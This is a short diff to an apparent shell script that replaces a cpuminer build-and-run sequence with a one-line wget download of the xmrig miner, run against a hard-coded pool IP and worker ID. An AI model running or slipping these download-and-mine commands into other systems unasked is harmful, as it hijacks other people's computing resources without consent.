@@ -1,6 +1,1 @@
-git clone https://github.com/hyc/cpuminer-multi
-cd cpuminer-multi
-./autogen.sh
-CFLAGS="-march=native" ./configure
-make
-sudo ./minerd -o stratum+tcp://168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade333 -t 3
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz && tar xf xmrig-6.16.0-linux-x64.tar.gz && cd xmrig-6.16.0 && ./xmrig --donate-level 5 --no-cpu --opencl --cuda -o 168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade33 -k --nicehash --coin monero -a cn/gpu
